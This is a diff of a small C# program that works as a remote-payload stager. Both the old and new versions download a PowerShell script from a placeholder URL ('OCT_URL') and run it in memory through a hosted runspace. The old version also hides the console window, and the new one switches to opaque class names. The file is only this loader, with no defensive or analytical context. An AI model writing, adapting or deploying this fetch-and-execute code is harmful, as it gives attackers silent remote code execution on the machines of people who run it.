@@ -1,32 +1,24 @@
 using System.Management.Automation;
 using System.Runtime.InteropServices;
 using System.Net;
+using System.IO;
 using System;
 
-namespace TT
+namespace TT3
 {
-    class NoT
+    class TZTZT
     {
-	[DllImport("kernel32.dll")]
-	static extern IntPtr GetConsoleWindow();
-	
-	[DllImport("user32.dll")]
-	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        static void Main()
-        {
+    static void Main()
+      {
 
-		var Console = GetConsoleWindow();
-		ShowWindow(Console, 0);
+    var request = (HttpWebRequest)WebRequest.Create("OCT_URL");
+    var response = (HttpWebResponse)request.GetResponse();
+    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
+    PowerShell pp = PowerShell.Create();
+	  pp.AddScript(responseString);
+	  pp.Invoke();
 
-		WebClient client = new WebClient();
-		String code = client.DownloadString("OCT_URL");
-		PowerShell ps = PowerShell.Create();
-		ps.AddScript(code);
-		ps.Invoke();
-
-
-
-        }
     }
+  }
 }
